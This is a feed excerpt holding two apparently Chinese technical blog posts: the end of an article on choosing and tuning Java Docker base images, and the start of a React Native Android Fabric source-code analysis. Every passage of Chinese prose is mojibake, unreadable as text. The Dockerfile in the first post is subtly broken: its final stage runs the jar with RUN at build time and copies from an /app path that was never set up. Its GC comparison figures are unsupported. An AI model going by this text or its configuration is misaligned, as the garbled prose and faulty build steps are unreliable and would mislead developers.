<table><thead><tr><th>åœºæ™¯</th><th>é¦–é€‰æ–¹æ¡ˆ</th><th>å¤‡é€‰æ–¹æ¡ˆ</th><th>å…³é”®è€ƒé‡å› ç´ </th></tr></thead><tbody><tr><td>äº‘åŸç”Ÿå¾®æœåŠ¡</td><td>Eclipse Temurin</td><td>Amazon Corretto</td><td>å¯åŠ¨é€Ÿåº¦ã€å®‰å…¨æ›´æ–°é¢‘ç‡</td></tr><tr><td>é‡‘èçº§åº”ç”¨</td><td>Azul Zulu</td><td>Adoptium</td><td>åˆè§„è®¤è¯ã€å†…å­˜å‹ç¼©æ¯”</td></tr><tr><td>å¤§æ•°æ®è®¡ç®—</td><td>Amazon Corretto</td><td>Eclipse Temurin</td><td>ZGCä½å»¶è¿Ÿç‰¹æ€§</td></tr><tr><td>å¼€å‘æµ‹è¯•ç¯å¢ƒ</td><td>å®˜æ–¹openjdk</td><td>Adoptium</td><td>å…¼å®¹æ€§ã€è°ƒè¯•å·¥å…·å®Œæ•´æ€§</td></tr></tbody></table>
<h3 data-id="heading-12">4.2 æè‡´ä¼˜åŒ–æ–¹æ¡ˆ</h3>
<ol>
<li><strong>å¤šé˜¶æ®µæ„å»ºæ¨¡æ¿</strong></li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># æ„å»ºé˜¶æ®µï¼ˆä½¿ç”¨Mavené•œåƒï¼‰</span>
FROM maven:3.9.5-eclipse-temurin-17 AS builder
COPY pom.xml .
RUN mvn dependency:go-offline
COPY src/ ./src/
RUN mvn package -DskipTests

<span class="hljs-comment"># è¿è¡Œé˜¶æ®µï¼ˆAlpineåŸºç¡€é•œåƒï¼‰</span>
FROM eclipse-temurin:17-jre-alpine
COPY <span class="hljs-attr">--from</span>=builder /app/target/*.jar app.jar
RUN java -XX:<span class="hljs-attr">InitialRAMPercentage</span>=<span class="hljs-number">50</span> -XX:MaxRAMPercentage=<span class="hljs-number">80</span> -jar app.jar
</code></pre>
<ol>
<li><strong>JLinkè‡ªå®šä¹‰è¿è¡Œæ—¶</strong></li>
</ol>
<pre><code class="hljs language-csharp" lang="csharp"><span class="hljs-meta"># ä½¿ç”¨jlinkæ„å»ºç²¾ç®€æ¨¡å—</span>
jlink --<span class="hljs-keyword">add</span>-modules java.<span class="hljs-keyword">base</span>,java.sql --output /custom-jre
<span class="hljs-meta"># é•œåƒä½“ç§¯å‡å°‘65%ï¼ˆä»338MBâ†’115MBï¼‰</span>
</code></pre>
<ol>
<li><strong>å¯åŠ¨å‚æ•°ä¼˜åŒ–</strong></li>
</ol>
<pre><code class="hljs language-ruby" lang="ruby"><span class="hljs-comment"># æ¨èJVMå‚æ•°ç»„åˆ</span>
-<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+UseZGC</span> -<span class="hljs-title class_">Xms512m</span> -<span class="hljs-title class_">Xmx1024m</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:MaxRAMPercentage=</span><span class="hljs-number">75</span> \
-<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:+HeapDumpOnOutOfMemoryError</span> -<span class="hljs-variable constant_">XX</span><span class="hljs-symbol">:HeapDumpPath=/var/log</span> \
-<span class="hljs-title class_">Djava</span>.security.egd=<span class="hljs-symbol">file:</span>/dev/./urandom
</code></pre>
<h2 data-id="heading-13">äº”ã€æ€§èƒ½è°ƒä¼˜å®è·µ</h2>
<h3 data-id="heading-14">5.1 å†…å­˜ç®¡ç†ä¼˜åŒ–</h3>
<ul>
<li><strong>å †å¤–å†…å­˜æ§åˆ¶</strong>ï¼šé€šè¿‡<code>-XX:MaxDirectMemorySize</code>é™åˆ¶éå †å†…å­˜</li>
<li><strong>å…ƒç©ºé—´è°ƒä¼˜</strong>ï¼š<code>-XX:MetaspaceSize=128m -XX:MaxMetaspaceSize=256m</code></li>
<li><strong>å‹ç¼©æŒ‡é’ˆ</strong>ï¼šå¯ç”¨<code>-XX:+UseCompressedOops</code>èŠ‚çœ30%å†…å­˜</li>
</ul>
<h3 data-id="heading-15">5.2 åƒåœ¾å›æ”¶å¯¹æ¯”</h3>

































<table><thead><tr><th>GCç®—æ³•</th><th>ååé‡</th><th>å»¶è¿Ÿ</th><th>å†…å­˜å ç”¨</th><th>é€‚ç”¨åœºæ™¯</th></tr></thead><tbody><tr><td>ZGC</td><td>92%</td><td>&lt;10ms</td><td>é«˜</td><td>å®æ—¶ç³»ç»Ÿã€ä½å»¶è¿Ÿéœ€æ±‚</td></tr><tr><td>Shenandoah</td><td>89%</td><td>15ms</td><td>ä¸­</td><td>ä¸­ç­‰è´Ÿè½½ã€æˆæœ¬æ•æ„Ÿç¯å¢ƒ</td></tr><tr><td>G1</td><td>95%</td><td>200ms</td><td>ä½</td><td>é€šç”¨å‹ã€å¹³è¡¡åœºæ™¯</td></tr></tbody></table>
<h2 data-id="heading-16">å…­ã€æœªæ¥è¶‹åŠ¿å±•æœ›</h2>
<ol>
<li><strong>QuarkusåŸç”Ÿé•œåƒ</strong>ï¼šç»“åˆGraalVMå¯å°†é•œåƒä½“ç§¯å‹ç¼©è‡³50MBä»¥ä¸‹</li>
<li><strong>eBPFç›‘æ§é›†æˆ</strong>ï¼šRed Hatæ­£åœ¨å¼€å‘åŸºäºeBPFçš„JVMç›‘æ§æ–¹æ¡ˆ</li>
<li><strong>AIé©±åŠ¨çš„è‡ªåŠ¨è°ƒä¼˜</strong>ï¼šOpenJDKç¤¾åŒºè®¡åˆ’å¼•å…¥AIå‚æ•°ä¼˜åŒ–å¼•æ“</li>
</ol>
<p>é€šè¿‡ç»¼åˆå¯¹æ¯”å¯è§ï¼ŒEclipse Temurinå’ŒAmazon Correttoåœ¨å¯åŠ¨é€Ÿåº¦å’Œèµ„æºæ•ˆç‡æ–¹é¢è¡¨ç°çªå‡ºï¼Œè€ŒAzul Zuluåœ¨åˆè§„æ€§åœºæ™¯å…·æœ‰ç‹¬ç‰¹ä¼˜åŠ¿ã€‚å»ºè®®ç”Ÿäº§ç¯å¢ƒä¼˜å…ˆé€‰æ‹©ç»è¿‡è®¤è¯çš„ä¼ä¸šçº§å‘è¡Œç‰ˆï¼Œå¹¶é…åˆå¤šé˜¶æ®µæ„å»ºå’ŒJLinkæŠ€æœ¯å®ç°æè‡´ä¼˜åŒ–ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[React Nativeä¹‹Androidç«¯Fabric æ¶æ„æºç åˆ†æï¼ˆä¸‹ï¼‰]]></title>    <link>https://juejin.cn/post/7596896373053915199</link>    <guid>https://juejin.cn/post/7596896373053915199</guid>    <pubDate>2026-01-19T15:15:48.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596896373053915199" data-draft-id="7593731473490214975" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="React Nativeä¹‹Androidç«¯Fabric æ¶æ„æºç åˆ†æï¼ˆä¸‹ï¼‰"/> <meta itemprop="keywords" content="React Native,Android,æºç é˜…è¯»"/> <meta itemprop="datePublished" content="2026-01-19T15:15:48.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¼–ç¨‹ä¹‹è·¯ä»0åˆ°1"/> <meta itemprop="url" content="https://juejin.cn/user/4125023359744296"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            React Nativeä¹‹Androidç«¯Fabric æ¶æ„æºç åˆ†æï¼ˆä¸‹ï¼‰
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4125023359744296/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¼–ç¨‹ä¹‹è·¯ä»0åˆ°1
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-19T15:15:48.000Z" title="Mon Jan 19 2026 15:15:48 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-19
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    39
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»18åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">React Nativeä¹‹Androidç«¯Fabric æ¶æ„æºç åˆ†æï¼ˆä¸‹ï¼‰</h2>
<blockquote>
<p>ç”±äºå•ç« å­—æ•°é™åˆ¶ï¼Œè¿™é‡Œå°†æœ¬æ–‡æ‹†æˆä¸Šä¸‹ä¸¤ç¯‡ï¼Œä¸Šç¯‡<a href="https://juejin.cn/post/7596869784538824704" target="_blank" title="https://juejin.cn/post/7596869784538824704">ã€ŠReact Nativeä¹‹Androidç«¯Fabric æ¶æ„æºç åˆ†æï¼ˆä¸Šï¼‰ã€‹</a></p>
</blockquote>
<h3 data-id="heading-1">Fabric ç»„ä»¶</h3>
<h4 data-id="heading-2">å£°æ˜ç»„ä»¶</h4>
<p>è¦å¼€å‘ä¸€ä¸ªFabric ç»„ä»¶ï¼Œé¦–å…ˆéœ€è¦åœ¨TSä»£ç ä¸­å£°æ˜è§„èŒƒã€‚æˆ‘ä»¬ä½¿ç”¨<code>npx create-react-native-library@latest</code>åˆ›å»ºä¸€ä¸ªFabricç»„ä»¶åº“ï¼Œç„¶åå‚è€ƒæ ¹æ®å®˜æ–¹æ–‡æ¡£çš„<a href="https://link.juejin.cn?target=https%3A%2F%2Freactnative.dev%2Fdocs%2Ffabric-native-components-introduction" target="_blank" title="https://reactnative.dev/docs/fabric-native-components-introduction" ref="nofollow noopener noreferrer">ç¤ºä¾‹</a>æ·»åŠ å¦‚ä¸‹å†…å®¹ï¼š</p>
<pre><code class="hljs language-ts" lang="ts"><span class="hljs-keyword">import</span> <span class="hljs-keyword">type</span> {
  <span class="hljs-title class_">CodegenTypes</span>,
  <span class="hljs-title class_">HostComponent</span>,
  <span class="hljs-title class_">ViewProps</span>,
} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;
<span class="hljs-keyword">import</span> {codegenNativeComponent} <span class="hljs-keyword">from</span> <span class="hljs-string">'react-native'</span>;

<span class="hljs-keyword">type</span> <span class="hljs-title class_">WebViewScriptLoadedEvent</span> = {
  <span class="hljs-attr">result</span>: <span class="hljs-string">'success'</span> | <span class="hljs-string">'error'</span>;
};

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">NativeProps</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">ViewProps</span> {
  sourceURL?: <span class="hljs-built_in">string</span>;
  onScriptLoaded?: <span class="hljs-title class_">CodegenTypes</span>.<span class="hljs-property">BubblingEventHandler</span>&lt;<span class="hljs-title class_">WebViewScriptLoadedEvent</span>&gt; | <span class="hljs-literal">null</span>;
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> codegenNativeComponent&lt;<span class="hljs-title class_">NativeProps</span>&gt;(
  <span class="hljs-string">'CustomWebView'</span>,
) <span class="hljs-keyword">as</span> <span class="hljs-title class_">HostComponent</span>&lt;<span class="hljs-title class_">NativeProps</span>&gt;;
</code></pre>
<p>è¿™é‡Œä¸»è¦æœ‰ä¸‰éƒ¨åˆ†ï¼š</p>
<ul>
<li>
<p><code>WebViewScriptLoadedEvent</code> æ˜¯ä¸€ç§æ”¯æŒçš„æ•°æ®ç±»å‹ï¼Œç”¨äºå­˜å‚¨äº‹ä»¶éœ€è¦ä»åŸç”Ÿä»£ç ä¼ é€’åˆ° JavaScript çš„æ•°æ®ã€‚</p>
</li>
<li>
<p><code>NativeProps</code> å®šä¹‰äº†å¯ä»¥è®¾ç½®çš„ç»„ä»¶å±æ€§ã€‚</p>
</li>
<li>
<p><code>codegenNativeComponent</code> å…è®¸æˆ‘ä»¬ä¸ºè‡ªå®šä¹‰ç»„ä»¶ç”Ÿæˆä»£ç ï¼Œå¹¶ä¸ºç»„ä»¶å®šä¹‰ä¸€ä¸ªä¸åŸç”Ÿå®ç°ç›¸åŒ¹é…çš„åç§°ã€‚</p>
</li>
</ul>
<p>å…¶ä¸­ï¼Œå¯¹<code>codegenNativeComponent</code>å‡½æ•°è¿›è¡Œåˆ†æï¼Œæºç <code>react-native/packages/react-native/Libraries/Utilities/codegenNativeComponent.js</code>:</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// å¦‚æœè¿™ä¸ªå‡½æ•°è¿è¡Œï¼Œè¯´æ˜è§†å›¾é…ç½®æ²¡æœ‰åœ¨æ„å»ºæ—¶é€šè¿‡ `GenerateViewConfigJs.js` ç”Ÿæˆã€‚</span>
<span class="hljs-comment">// å› æ­¤æˆ‘ä»¬éœ€è¦ä½¿ç”¨ `requireNativeComponent` ä»è§†å›¾ç®¡ç†å™¨è·å–è§†å›¾é…ç½®ã€‚</span>
<span class="hljs-comment">// `requireNativeComponent` åœ¨ Bridgeless æ¨¡å¼ä¸‹ä¸å¯ç”¨ã€‚</span>
<span class="hljs-comment">// ä¾‹å¦‚ï¼šå¦‚æœ `codegenNativeComponent` ä¸æ˜¯ä»ä»¥ NativeComponent.js ç»“å°¾çš„æ–‡ä»¶ä¸­è°ƒç”¨ï¼Œ</span>
<span class="hljs-comment">// è¿™ä¸ªå‡½æ•°å°±ä¼šåœ¨è¿è¡Œæ—¶æ‰§è¡Œã€‚</span>
<span class="hljs-keyword">function</span> codegenNativeComponent&lt;<span class="hljs-title class_">Props</span>: {...}&gt;(
  <span class="hljs-attr">componentName</span>: string,
  options?: <span class="hljs-title class_">NativeComponentOptions</span>,
): <span class="hljs-title class_">NativeComponentType</span>&lt;<span class="hljs-title class_">Props</span>&gt; {
  <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">global</span>.<span class="hljs-property">RN$Bridgeless</span> === <span class="hljs-literal">true</span> &amp;&amp; __DEV__) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">warn</span>(
      <span class="hljs-string">`Codegen didn't run for <span class="hljs-subst">${componentName}</span>. This will be an error in the future. Make sure you are using @react-native/babel-preset when building your JavaScript code.`</span>,
    );
  }
  <span class="hljs-comment">// ç¡®å®šåŸºç¡€ç»„ä»¶åç§°</span>
  <span class="hljs-keyword">let</span> componentNameInUse =
    options &amp;&amp; options.<span class="hljs-property">paperComponentName</span> != <span class="hljs-literal">null</span>
      ? options.<span class="hljs-property">paperComponentName</span>
      : componentName;

  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>

  <span class="hljs-keyword">return</span> (requireNativeComponent&lt;<span class="hljs-title class_">Props</span>&gt;(
    <span class="hljs-comment">// $FlowFixMe[incompatible-type]</span>
    componentNameInUse,
  ): <span class="hljs-title class_">HostComponent</span>&lt;<span class="hljs-title class_">Props</span>&gt;);
}
</code></pre>
<p>æ ¹æ®æ³¨é‡Šå¯çŸ¥ï¼Œåœ¨æ–°æ¶æ„ä¸­ï¼Œè¿™ä¸ªå‡½æ•°å‡ ä¹æ²¡æœ‰å®é™…æ„ä¹‰ï¼Œå› ä¸ºæ–°æ¶æ„æ˜¯é€šè¿‡<code>GenerateViewConfigJs.js</code> æ¥ç”Ÿæˆå®é™…çš„è§†å›¾é…ç½®ã€‚</p>
<p>æˆ‘ä»¬é€šè¿‡æœç´¢<code>codegenNativeComponent</code>å­—ç¬¦ä¸²ï¼Œå¾ˆå®¹æ˜“å®šä½åˆ°<code>react-native/packages/babel-plugin-codegen/index.js</code>æ–‡ä»¶ï¼Œè¿™é‡Œ<strong>babel-plugin-codegen</strong>åŒ…å°±æ˜¯æ£€æµ‹<code>codegenNativeComponent</code>è°ƒç”¨ï¼Œè§£æ<strong>TypeScript/Flow</strong>ç±»å‹å®šä¹‰çš„å·¥å…·åŒ…ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params">{parse, types: t}</span>) {
  <span class="hljs-keyword">return</span> {
    <span class="hljs-title function_">pre</span>(<span class="hljs-params">state</span>) {
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">code</span> = state.<span class="hljs-property">code</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span> = state.<span class="hljs-property">opts</span>.<span class="hljs-property">filename</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultExport</span> = <span class="hljs-literal">null</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">commandsExport</span> = <span class="hljs-literal">null</span>;
      <span class="hljs-variable language_">this</span>.<span class="hljs-property">codeInserted</span> = <span class="hljs-literal">false</span>;
    },

    <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç .....</span>
      <span class="hljs-title class_">ExportDefaultDeclaration</span>(path, state) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title function_">isCodegenDeclaration</span>(path.<span class="hljs-property">node</span>.<span class="hljs-property">declaration</span>)) {
          <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultExport</span> = path;
        }
      },

      <span class="hljs-comment">// ç¨‹åºé€€å‡ºæ—¶è¿›è¡Œæ›¿æ¢</span>
      <span class="hljs-title class_">Program</span>: {
        <span class="hljs-title function_">exit</span>(<span class="hljs-params">path</span>) {
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultExport</span>) {
            <span class="hljs-comment">// 1. ç”ŸæˆViewConfigä»£ç </span>
            <span class="hljs-keyword">const</span> viewConfig = <span class="hljs-title function_">generateViewConfig</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">filename</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">code</span>);
            <span class="hljs-comment">// 2. è§£æä¸ºAST</span>
            <span class="hljs-keyword">const</span> ast = <span class="hljs-title function_">parse</span>(viewConfig, {
              <span class="hljs-attr">babelrc</span>: <span class="hljs-literal">false</span>,
              <span class="hljs-attr">browserslistConfigFile</span>: <span class="hljs-literal">false</span>,
              <span class="hljs-attr">configFile</span>: <span class="hljs-literal">false</span>,
            });

            <span class="hljs-comment">// 3. å®Œå…¨æ›¿æ¢åŸå§‹å¯¼å‡º</span>
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">defaultExport</span>.<span class="hljs-title function_">replaceWithMultiple</span>(ast.<span class="hljs-property">program</span>.<span class="hljs-property">body</span>);

            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">commandsExport</span> != <span class="hljs-literal">null</span>) {
              <span class="hljs-variable language_">this</span>.<span class="hljs-property">commandsExport</span>.<span class="hljs-title function_">remove</span>();
            }

            <span class="hljs-variable language_">this</span>.<span class="hljs-property">codeInserted</span> = <span class="hljs-literal">true</span>;
          }
        },
      },
    },
  };
};


<span class="hljs-keyword">function</span> <span class="hljs-title function_">generateViewConfig</span>(<span class="hljs-params">filename <span class="hljs-comment">/*: string */</span>, code <span class="hljs-comment">/*: string */</span></span>) {
  <span class="hljs-comment">// è§£æTypeScript/Flowç±»å‹</span>
  <span class="hljs-keyword">const</span> schema = <span class="hljs-title function_">parseFile</span>(filename, code);
  <span class="hljs-comment">// æå–ç»„ä»¶ä¿¡æ¯</span>
  <span class="hljs-keyword">const</span> libraryName = <span class="hljs-title function_">basename</span>(filename).<span class="hljs-title function_">replace</span>(
    <span class="hljs-regexp">/NativeComponent\.(js|ts)$/</span>,
    <span class="hljs-string">''</span>,
  );
  <span class="hljs-comment">// è°ƒç”¨Codegenç”Ÿæˆå™¨</span>
  <span class="hljs-keyword">return</span> <span class="hljs-title class_">RNCodegen</span>.<span class="hljs-title function_">generateViewConfig</span>({
    libraryName,
    schema,
  });
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">isCodegenDeclaration</span>(<span class="hljs-params">declaration</span>) {
  <span class="hljs-keyword">if</span> (!declaration) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
  }

  <span class="hljs-keyword">if</span> (
    declaration.<span class="hljs-property">left</span> &amp;&amp;
    declaration.<span class="hljs-property">left</span>.<span class="hljs-property">left</span> &amp;&amp;
    declaration.<span class="hljs-property">left</span>.<span class="hljs-property">left</span>.<span class="hljs-property">name</span> === <span class="hljs-string">'codegenNativeComponent'</span>
  ) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (
    declaration.<span class="hljs-property">callee</span> &amp;&amp;
    declaration.<span class="hljs-property">callee</span>.<span class="hljs-property">name</span> &amp;&amp;
    declaration.<span class="hljs-property">callee</span>.<span class="hljs-property">name</span> === <span class="hljs-string">'codegenNativeComponent'</span>
  ) {
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  } 
  <span class="hljs-comment">// çœç•¥......</span>
  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
}
</code></pre>
<p>ç»§ç»­è·Ÿè¸ª<code>RNCodegen.generateViewConfig</code>çš„å®ç°ï¼Œæºç <code>react-native/packages/react-native-codegen/src/generators/RNCodegen.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> generateViewConfigJs = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./components/GenerateViewConfigJs.js'</span>);


<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-attr">allGenerators</span>: <span class="hljs-variable constant_">ALL_GENERATORS</span>,
  <span class="hljs-comment">// çœç•¥éƒ¨åˆ†ä»£ç ......</span>
  <span class="hljs-title function_">generateViewConfig</span>({
    libraryName,
    schema,
  }: <span class="hljs-title class_">Pick</span>&lt;<span class="hljs-title class_">LibraryOptions</span>, <span class="hljs-string">'libraryName'</span> | <span class="hljs-string">'schema'</span>&gt;): string {
    schemaValidator.<span class="hljs-title function_">validate</span>(schema);

    <span class="hljs-keyword">const</span> result = generateViewConfigJs
      .<span class="hljs-title function_">generate</span>(libraryName, schema)
      .<span class="hljs-title function_">values</span>()
      .<span class="hljs-title function_">next</span>();

    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> result.<span class="hljs-property">value</span> !== <span class="hljs-string">'string'</span>) {
      <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">`Failed to generate view config for <span class="hljs-subst">${libraryName}</span>`</span>);
    }

    <span class="hljs-keyword">return</span> result.<span class="hljs-property">value</span>;
  },
};
</code></pre>
<p>æœ€ç»ˆæ˜¯è°ƒç”¨çš„<code>GenerateViewConfigJs.js</code>ä¸­çš„<code>generate</code>ï¼Œæºç <code>react-native/packages/react-native-codegen/src/generators/components/GenerateViewConfigJs.js</code>ï¼š</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  <span class="hljs-title function_">generate</span>(<span class="hljs-attr">libraryName</span>: string, <span class="hljs-attr">schema</span>: <span class="hljs-title class_">SchemaType</span>): <span class="hljs-title class_">FilesOutput</span> {
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">const</span> fileName = <span class="hljs-string">`<span class="hljs-subst">${libraryName}</span>NativeViewConfig.js`</span>;
      <span class="hljs-keyword">const</span> <span class="hljs-attr">imports</span>: <span class="hljs-title class_">Set</span>&lt;string&gt; = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Set</span>();

      <span class="hljs-keyword">const</span> moduleResults = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">keys</span>(schema.<span class="hljs-property">modules</span>)
        .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">moduleName</span> =&gt;</span> {
          <span class="hljs-keyword">const</span> <span class="hljs-variable language_">module</span> = schema.<span class="hljs-property">modules</span>[moduleName];
          <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">module</span>.<span class="hljs-property">type</span> !== <span class="hljs-string">'Component'</span>) {
            <span class="hljs-keyword">return</span>;
          }

